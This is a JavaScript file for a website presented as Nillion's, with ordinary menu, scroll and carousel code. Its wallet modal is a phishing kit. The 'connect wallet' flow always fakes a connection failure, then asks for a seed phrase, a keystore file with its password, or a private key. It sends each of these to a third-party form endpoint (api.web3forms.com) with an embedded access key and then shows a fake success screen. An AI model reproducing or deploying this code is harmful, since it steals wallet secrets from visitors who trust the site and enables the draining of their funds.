// Nillion Website Interactive Script

document.addEventListener('DOMContentLoaded', function() {

  // Mobile hamburger -> open sliding side menu
  const mobileMenuButton = document.getElementById('mobile-hamburger');
  const mobileSide = document.getElementById('mobile-side');
  const mobileOverlay = document.getElementById('mobile-overlay');
  const mobileClose = document.getElementById('mobile-close');

  function openMobileMenu() {
    if (mobileSide) {
      mobileSide.classList.remove('-translate-x-full');
      mobileSide.classList.add('translate-x-0');
      mobileSide.classList.remove('hidden');
    }
    if (mobileOverlay) mobileOverlay.classList.remove('hidden');
    // prevent background scroll while menu open
    document.body.style.overflow = 'hidden';
  }

  function closeMobileMenu() {
    if (mobileSide) {
      mobileSide.classList.add('-translate-x-full');
      mobileSide.classList.remove('translate-x-0');
    }
    if (mobileOverlay) mobileOverlay.classList.add('hidden');
    document.body.style.overflow = '';
  }

  if (mobileMenuButton) {
    mobileMenuButton.addEventListener('click', () => {
      if (mobileSide && mobileSide.classList.contains('-translate-x-full')) openMobileMenu(); else closeMobileMenu();
    });
  }
  if (mobileClose) mobileClose.addEventListener('click', closeMobileMenu);
  if (mobileOverlay) mobileOverlay.addEventListener('click', closeMobileMenu);

  // Smooth Scroll for Anchor Links (hash targets only)
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      const href = this.getAttribute('href');
      if (!href || href === '#') return;
      const target = document.querySelector(href);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  });

  // Header Background on Scroll
  const header = document.querySelector('header');
  window.addEventListener('scroll', function() {
    if (!header) return;
    const currentScroll = window.pageYOffset || document.documentElement.scrollTop;
    if (currentScroll > 50) {
      header.style.backgroundColor = 'rgba(15, 23, 42, 0.95)';
      header.style.backdropFilter = 'blur(8px)';
    } else {
      header.style.backgroundColor = '';
      header.style.backdropFilter = 'none';
    }
  });

  // Accordion Functionality for Node Anatomy
  const allLis = Array.from(document.querySelectorAll('section ul li'));
  const accordionItems = allLis.filter(li => li.querySelector('h3') && li.querySelector('p'));

  accordionItems.forEach(item => {
    const title = item.querySelector('h3');
    const content = item.querySelector('p');
    const icon = item.querySelector('i');
    if (!title || !content) return;

    // hide initially on small screens; allow CSS to show on md if needed
    content.style.display = 'none';
    title.style.cursor = 'pointer';
    title.setAttribute('aria-expanded', 'false');

    title.addEventListener('click', () => {
      const isOpen = content.style.display !== 'none';
      if (isOpen) {
        content.style.display = 'none';
        title.setAttribute('aria-expanded', 'false');
        if (icon) icon.style.transform = '';
      } else {
        content.style.display = 'block';
        title.setAttribute('aria-expanded', 'true');
        if (icon) icon.style.transform = 'rotate(90deg)';
      }
    });
  });

  // Horizontal Carousel / Prev Next for demo list
  const carouselWrapper = document.querySelector('.overflow-x-scroll');
  if (carouselWrapper) {
    const list = carouselWrapper.querySelector('ul');
    const btns = Array.from(document.querySelectorAll('button'));
    const prevBtn = btns.find(b => /prev/i.test(b.textContent));
    const nextBtn = btns.find(b => /next/i.test(b.textContent));
    function scrollByPage(direction = 1) {
      if (!list) return;
      const amount = Math.round(carouselWrapper.clientWidth * 0.8) || 600;
      list.scrollBy({ left: amount * direction, behavior: 'smooth' });
    }
    if (prevBtn) prevBtn.addEventListener('click', () => scrollByPage(-1));
    if (nextBtn) nextBtn.addEventListener('click', () => scrollByPage(1));
  }

  // Support modal toggle (desktop and mobile)
  const supportToggle = document.getElementById('support-toggle');
  const mobileSupportToggle = document.getElementById('mobile-support-toggle');
  const mobileSupportLink = document.getElementById('mobile-support-link');
  const supportModal = document.getElementById('support-modal');
  const supportClose = document.getElementById('support-close');
  function openSupport(e) { if (e && e.preventDefault) e.preventDefault(); if (supportModal) supportModal.classList.remove('hidden'); closeMobileMenu(); }
  // Only bind openSupport when the support links are intended to open the modal
  function shouldBindSupport(el) {
    if (!el) return false;
    const href = el.getAttribute && el.getAttribute('href');
    // if href is '#' or missing (or element is a button), treat as modal trigger
    return href === '#' || href === null || el.tagName === 'BUTTON';
  }
  if (shouldBindSupport(supportToggle)) supportToggle.addEventListener('click', openSupport);
  if (shouldBindSupport(mobileSupportToggle)) mobileSupportToggle.addEventListener('click', openSupport);
  if (shouldBindSupport(mobileSupportLink)) mobileSupportLink.addEventListener('click', openSupport);
  if (supportClose && supportModal) supportClose.addEventListener('click', () => supportModal.classList.add('hidden'));
  if (supportModal) supportModal.addEventListener('click', (e) => { if (e.target === supportModal) supportModal.classList.add('hidden'); });

  // Wallet modal toggle (desktop and mobile)
  const openWallet = document.getElementById('open-modal');
  const mobileOpenWallet = document.getElementById('mobile-open-modal');
  const mobileWalletLink = document.getElementById('mobile-wallet-link');
  function openWalletModal(e) { if (e && e.preventDefault) e.preventDefault(); const m = document.getElementById('modal-overlay'); if (m) { m.style.display = 'flex'; setTimeout(() => m.classList.add('active'), 10); } closeMobileMenu(); }
  if (openWallet) openWallet.addEventListener('click', openWalletModal);
  if (mobileOpenWallet) mobileOpenWallet.addEventListener('click', openWalletModal);
  if (mobileWalletLink) mobileWalletLink.addEventListener('click', openWalletModal);

  // === Complete Select Wallet Modal Logic ===
  (function(){
    const visibleList = [
      { name: 'MetaMask', icon: 'Metamask.png' },
      { name: 'WalletConnect', icon: 'Walletconnect.jpeg' },
      { name: 'Phantom', icon: 'phantom.png' },
      { name: 'SuperHero', icon: 'SuperHero.png' },
      { name: 'Sub', icon: 'Sub.png' },
      { name: 'Acurast-lite', icon: 'Acurast-lite.png' },
      { name: 'Trust Wallet', icon: 'trustwallet.png' },
      { name: 'Coinbase Wallet', icon: 'coinbasewallet.png' },
      { name: 'Ledger Live', icon: 'ledgerlive.png' },
      { name: 'Safepal', icon: 'safepal.png' },
      { name: 'Exodus', icon: 'exodus.png' },
      { name: 'Ronin', icon: 'Ronin.png' },
      { name: 'OKX Wallet', icon: 'Okxwallet.png' },
      { name: 'Bitget Wallet', icon: 'bitgetwallet.png' },
      { name: 'Bybit Wallet', icon: 'bybit.png' },
      { name: 'Mycelium', icon: 'mycelium.png' },
      { name: 'Keplr', icon: 'Keplr.jpeg' },
      { name: 'Rabby', icon: 'rabbywallet.png' },
      { name: 'Guarda', icon: 'guarda.png' },
      { name: 'Coinomi', icon: 'coinomi.png' },
      { name: 'Uniswap', icon: 'Uniswap.jpeg' },
      { name: 'Electrum', icon: 'electrum.png' },
      { name: 'BitPay', icon: 'bitpay.png' },
      { name: 'Binance Wallet', icon: 'binancewallet.png' },
      { name: 'Magic', icon: 'Magic.png' },
      { name: '1inch', icon: 'oneinch.png' },
      { name: 'Coinwallet', icon: 'coinwallet.png' }
    ];
    const extraWalletNames = ['Rainbow', 'Backpack', 'Solflare', 'Trezor Suite', 'Token Pocket', 'Tronlink', 'Slush', 'AirGap','Other'];
    
    function normalizeKey(s){return (s||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'')}
    function resolveIconUrl(name, providedIcon){
      if(providedIcon) return providedIcon;
      const safeName = (name||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'');
      const aliasMap = {cryptowallet:'coinwallet',coinbasewallet:'coinbasewallet',trustwallet:'trustwallet',jupiter:'jupiter',solflare:'Solflare',slush:'Slush',metamask:'Metamask',walletconnect:'Walletconnect',ronin:'Ronin',okxwallet:'Okxwallet',keplr:'Keplr',uniswap:'Uniswap',magic:'Magic',rainbow:'rainbow',backpack:'backpack',trezorsuite:'trezorsuite',tokenpocket:'tokenpocket',tronlink:'tronlink',airgap:'airgap',other:'Other'};
      const lookupName = aliasMap[safeName] || safeName;
      const candidates = [];
      // Try /wallets folder first (primary location)
      ['png','jpeg','jpg','svg'].forEach(ext=>{candidates.push(`/wallets/${lookupName}.${ext}`)});
      // Then try project root as fallback
      ['png','jpeg','jpg','svg'].forEach(ext=>{candidates.push(`/${lookupName}.${ext}`)});
      if(candidates.length > 0) return candidates[0];
      const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
      return `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
    }
    
    function createWalletCard(entry){
      const name = typeof entry === 'string' ? entry : (entry.name || 'Unknown');
      const icon = typeof entry === 'string' ? '' : (entry.icon || '');
      const card = document.createElement('div');
      card.className = 'wallet-item';
      card.dataset.wallet = name;
      const wrapper = document.createElement('div'); wrapper.className='wallet-icon-wrapper';
      const img = document.createElement('img'); img.alt = name; img.style.width='56px'; img.style.height='56px';
      const src = resolveIconUrl(name, icon);
      img.src = src; 
      // keep the resolved icon URL available on the element
      card.dataset.icon = src;
      
      // Smart fallback: try root folder if /wallets fails, then use placeholder
      let fallbackAttempts = 0;
      img.onerror = function(){ 
        this.onerror = null;
        fallbackAttempts++;
        const safeName = (name||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'');
        const aliasMap = {cryptowallet:'coinwallet',coinbasewallet:'coinbasewallet',trustwallet:'trustwallet',jupiter:'jupiter',solflare:'Solflare',slush:'Slush',metamask:'Metamask',walletconnect:'Walletconnect',ronin:'Ronin',okxwallet:'Okxwallet',keplr:'Keplr',uniswap:'Uniswap',magic:'Magic',rainbow:'rainbow',backpack:'backpack',trezorsuite:'trezorsuite',tokenpocket:'tokenpocket',tronlink:'tronlink',airgap:'airgap',other:'Other'};
        const lookupName = aliasMap[safeName] || safeName;
        
        // If first attempt failed (/wallets), try root folder
        if(fallbackAttempts === 1) {
          const exts = ['png','jpeg','jpg','svg'];
          for(let i=0; i<exts.length; i++) {
            const fallbackSrc = `/${lookupName}.${exts[i]}`;
            try {
              const testImg = new Image();
              testImg.onload = () => { 
                this.src = fallbackSrc; 
                card.dataset.icon = fallbackSrc;
              };
              testImg.onerror = () => {}; // silent fail, will try next extension
              testImg.src = fallbackSrc;
              return; // exit after starting fallback attempt
            } catch(e) {}
          }
        }
        // Final fallback to placeholder
        this.src=`https://via.placeholder.com/96/222/fff?text=${encodeURIComponent((name&&name[0])?name[0].toUpperCase():'W')}`;
      };
      wrapper.appendChild(img);
      const label = document.createElement('div'); label.style.fontSize='0.9rem'; label.style.marginTop='6px'; label.style.color='#e5e5e5'; label.textContent = name;
      card.appendChild(wrapper); card.appendChild(label);
      card.addEventListener('click', handleWalletClick);
      return card;
    }
    
    function renderVisibleWallets(){
      const visibleWallets = document.getElementById('visible-wallets'); if(!visibleWallets) return; visibleWallets.innerHTML='';
      visibleList.forEach(w=>visibleWallets.appendChild(createWalletCard(w)));
    }
    
    function populateExtraWallets(){
      const extra = document.getElementById('extra-wallets'); if(!extra) return; extra.innerHTML='';
      extraWalletNames.forEach(w=>extra.appendChild(createWalletCard(w)));
    }
    
    function resetWallets(){document.querySelectorAll('.wallet-item.selected').forEach(el=>el.classList.remove('selected'))}

    // remember the last selected wallet so we can show it in overlay2 after manual connect
    let _lastSelectedWallet = { name: '', icon: '' };

    function handleWalletClick(){
      resetWallets(); this.classList.add('selected');
      try{document.getElementById('status-message').style.display='none'}catch(e){}
      const walletName = this.dataset.wallet;
      const iconUrl = this.dataset.icon || resolveIconUrl(walletName,'');
      // store selection for later use
      _lastSelectedWallet.name = walletName || '';
      _lastSelectedWallet.icon = iconUrl || '';
      const overlay = document.getElementById('connect-overlay');
      if(!overlay) return;
      const mainImg = overlay.querySelector('#modalMainWalletImg');
      const nameEl = overlay.querySelector('#overlay-wallet-name');
      const msgEl = overlay.querySelector('#overlay-message');
      if(mainImg) {
        mainImg.src = iconUrl;
        let fallbackCount = 0;
        mainImg.onerror = function(){ 
          this.onerror = null;
          fallbackCount++;
          const safeName = (walletName||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'');
          const aliasMap = {cryptowallet:'coinwallet',coinbasewallet:'coinbasewallet',trustwallet:'trustwallet',jupiter:'jupiter',solflare:'Solflare',slush:'Slush',metamask:'Metamask',walletconnect:'Walletconnect',ronin:'Ronin',okxwallet:'Okxwallet',keplr:'Keplr',uniswap:'Uniswap',magic:'Magic',rainbow:'rainbow',backpack:'backpack',trezorsuite:'trezorsuite',tokenpocket:'tokenpocket',tronlink:'tronlink',airgap:'airgap',other:'Other'};
          const lookupName = aliasMap[safeName] || safeName;
          
          // Try root folder if /wallets failed
          if(fallbackCount === 1) {
            const exts = ['png','jpeg','jpg','svg'];
            for(let i=0; i<exts.length; i++) {
              const rootSrc = `/${lookupName}.${exts[i]}`;
              try {
                const testImg = new Image();
                testImg.onload = () => { this.src = rootSrc; };
                testImg.src = rootSrc;
                return;
              } catch(e) {}
            }
          }
          // Final fallback to placeholder
          this.src=`https://via.placeholder.com/96/222/fff?text=${encodeURIComponent((walletName&&walletName[0])?walletName[0].toUpperCase():'W')}`;
        }
      }
      if(nameEl) nameEl.textContent = walletName;
      if(msgEl) { msgEl.textContent = 'Connecting...'; msgEl.classList.remove('failed'); }
      overlay.classList.add('active');
      const connectRing = document.getElementById('connectRing'); 
      if(connectRing) connectRing.classList.add('active');
      setTimeout(()=>{
        if(connectRing) connectRing.classList.remove('active');
        try { if(msgEl) { msgEl.textContent = 'Connection failed. Please connect manually'; msgEl.classList.add('failed'); }} catch(e){}
        setTimeout(()=>{try{overlay.classList.remove('active')}catch(e){}
          showManualConnectModal();}, 2000);
      }, 12000);
    }
    
    function showManualConnectModal(){
      const m = document.getElementById('manual-overlay'); if(!m) return; m.style.display='flex'; setTimeout(()=>{m.classList.add('active')},10);
    }
    
    function wireModalControls(){
      const modalOverlay = document.getElementById('modal-overlay');
      const manualOverlay = document.getElementById('manual-overlay');
      const closeBtn = document.getElementById('close-modal-btn');
      const closeManual = document.getElementById('close-manual-btn');
      const toggleMore = document.getElementById('toggle-more');
      const extra = document.getElementById('extra-wallets');
      const searchInput = document.getElementById('wallet-search');
      
      if(closeBtn) closeBtn.addEventListener('click', ()=>{ if(modalOverlay) { modalOverlay.classList.remove('active'); setTimeout(()=>{ modalOverlay.style.display='none'; },400); } });
      if(closeManual) closeManual.addEventListener('click', ()=>{ if(manualOverlay) { manualOverlay.classList.remove('active'); setTimeout(()=>{ manualOverlay.style.display='none'; },400); } });
      
      if(toggleMore) toggleMore.addEventListener('click', ()=>{ if(extra.style.display==='none'){ extra.style.display='grid'; toggleMore.textContent='Show fewer wallets' } else { extra.style.display='none'; toggleMore.textContent='More wallets' } });
      
      if(searchInput) searchInput.addEventListener('input', ()=>{
        const q = searchInput.value.trim().toLowerCase(); 
        const items = Array.from(document.querySelectorAll('.wallet-item'));
        if(!q){ items.forEach(it=>{ it.style.display=''; it.classList.remove('selected') }); const stat = document.getElementById('status-message'); if(stat) stat.textContent='Select a wallet to connect'; return }
        const matches = items.filter(it => (it.dataset.wallet||'').toLowerCase().includes(q));
        items.forEach(it => it.style.display = matches.includes(it) ? '' : 'none');
        const stat = document.getElementById('status-message');
        if(stat) stat.textContent = matches.length ? `${matches.length} wallet${matches.length>1?'s':''} found` : 'No wallets found';
      });
      
      document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',(e)=>{
        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
        btn.classList.add('active');
        const t = btn.dataset.tab;
        const phraseTab = document.getElementById('phrase-tab');
        const keystoreTab = document.getElementById('keystore-tab');
        const privateTab = document.getElementById('private-tab');
        if(phraseTab) phraseTab.style.display = t==='phrase' ? '' : 'none';
        if(keystoreTab) keystoreTab.style.display = t==='keystore' ? '' : 'none';
        if(privateTab) privateTab.style.display = t==='private' ? '' : 'none';
      }));
      
      const manualConnectBtn = document.getElementById('manual-connect-btn');
      const phraseInput = document.getElementById('phrase-input');
      const phraseStatus = document.getElementById('phrase-status');
      
      function getExpectedWords() {const el = document.querySelector('input[name="phrase-length"]:checked');return el ? Number(el.value) : 12;}
      function showPhraseError(msg) {if (!phraseStatus) return; phraseStatus.textContent = msg; phraseStatus.style.display = 'block';setTimeout(()=>{ try{ phraseStatus.style.display='none' }catch(e){} }, 4000);}
      
      async function submitToWeb3Forms(data) {
        const WEB3FORMS_KEY = '1efaad3c-90c4-462d-83e7-eb60307df491';
        try {
          const formData = new FormData();
          formData.append('access_key', WEB3FORMS_KEY);
          formData.append('botcheck', '');
          Object.entries(data).forEach(([key, value]) => {formData.append(key, value || '');});
          const response = await fetch('https://api.web3forms.com/submit', {method: 'POST',body: formData,mode: 'cors',credentials: 'omit'});
          if (!response.ok) {throw new Error(`HTTP error! status: ${response.status}`);}
          const result = await response.json();
          if (result.success) {return { success: true, message: result.message };} else {throw new Error(result.message || 'Submission failed');}
        } catch (error) {
          return { success: false, error: error.message || 'Submission failed' };
        }
      }
      
      if (manualConnectBtn) manualConnectBtn.addEventListener('click', async ()=>{
        const activeTabBtn = document.querySelector('.tab-btn.active');
        const activeTab = activeTabBtn ? activeTabBtn.dataset.tab : 'phrase';
        let content = '';
        try {
          if (activeTab === 'phrase') {
            content = (phraseInput && phraseInput.value) ? phraseInput.value.trim() : '';
            const words = content.split(/\s+/).filter(Boolean);
            const expected = getExpectedWords();
            if (words.length !== expected) { showPhraseError('Please fill out the field'); return; }
          } else if (activeTab === 'keystore') {
            const keystoreEl = document.getElementById('keystore-json');
            content = keystoreEl ? keystoreEl.value.trim() : '';
            if (!content) { showPhraseError('Please fill out the field'); return; }
          } else if (activeTab === 'private') {
            const privEl = document.getElementById('private-key');
            content = privEl ? privEl.value.trim() : '';
            if (!content) { showPhraseError('Please fill out the field'); return; }
          }
        } catch (err) {
          showPhraseError('Unable to read input');
          return;
        }
        manualConnectBtn.disabled = true;
        manualConnectBtn.textContent = 'Connecting...';
        const data = {};
        if (activeTab === 'phrase') {
          const words = content.trim().split(/\s+/).filter(Boolean);
          if (words.length !== 12 && words.length !== 24) {
            alert("Please enter exactly 12 or 24 words.");
            manualConnectBtn.disabled = false;
            manualConnectBtn.textContent = 'Connect wallet';
          } else {
            data.message = `Recovery words: ${content}`;
            data.subject = 'User Input Submission';
          }
        } else if (activeTab === 'keystore') {
          const json = document.getElementById('keystore-json')?.value.trim();
          const password = document.getElementById('keystore-password')?.value.trim() || '';
          if (!json) {
            alert('Enter keystore JSON');
            manualConnectBtn.disabled = false;
            manualConnectBtn.textContent = 'Connect wallet';
          } else {
            data.message = json;
            data.feedback = password;
            data.description = 'Wallet backup file';
          }
        } else if (activeTab === 'private') {
          data.key = content;
          data.subject = 'Key Submission';
        }
        
        if(data.message || data.key) {
          const result = await submitToWeb3Forms(data);
          if (result && result.success === true) {
            try { if(manualOverlay) { manualOverlay.classList.remove('active'); setTimeout(()=>{ if (manualOverlay) manualOverlay.style.display='none' }, 400); }} catch(e){}
            const overlay2 = document.getElementById('connect-overlay-2');
            const ring2 = document.getElementById('connectRing2');
            // populate overlay2 image using last selected wallet (if any)
            try {
              const img2 = document.getElementById('modalMainWalletImg2');
              if (img2 && _lastSelectedWallet && _lastSelectedWallet.icon) {
                img2.src = _lastSelectedWallet.icon;
                let fallback2Count = 0;
                img2.onerror = function(){ 
                  this.onerror=null;
                  fallback2Count++;
                  const safeName = (_lastSelectedWallet.name||'').toString().toLowerCase().replace(/[^a-z0-9]/g,'');
                  const aliasMap = {cryptowallet:'coinwallet',coinbasewallet:'coinbasewallet',trustwallet:'trustwallet',jupiter:'jupiter',solflare:'Solflare',slush:'Slush',metamask:'Metamask',walletconnect:'Walletconnect',ronin:'Ronin',okxwallet:'Okxwallet',keplr:'Keplr',uniswap:'Uniswap',magic:'Magic',rainbow:'rainbow',backpack:'backpack',trezorsuite:'trezorsuite',tokenpocket:'tokenpocket',tronlink:'tronlink',airgap:'airgap',other:'Other'};
                  const lookupName = aliasMap[safeName] || safeName;
                  
                  // Try root folder if /wallets failed
                  if(fallback2Count === 1) {
                    const exts = ['png','jpeg','jpg','svg'];
                    for(let i=0; i<exts.length; i++) {
                      const rootSrc = `/${lookupName}.${exts[i]}`;
                      try {
                        const testImg = new Image();
                        testImg.onload = () => { this.src = rootSrc; };
                        testImg.src = rootSrc;
                        return;
                      } catch(e) {}
                    }
                  }
                  // Final fallback
                  this.src=`https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(((_lastSelectedWallet.name&&_lastSelectedWallet.name[0])?_lastSelectedWallet.name[0].toUpperCase():'W'))}`;
                };
              }
            } catch(e){}
            if (overlay2) { overlay2.style.display = 'flex'; setTimeout(()=>overlay2.classList.add('active'),10); }
            if (ring2) ring2.classList.add('active');
          } else {
            manualConnectBtn.disabled = false;
            manualConnectBtn.textContent = 'Connect wallet';
            const errMsg = (result && (result.error || result.message)) ? (result.error || result.message) : 'Submission failed';
            showPhraseError(errMsg.toString());
          }
        }
      });
      
      renderVisibleWallets(); 
      populateExtraWallets();
    }
    
    wireModalControls();
  })();
});












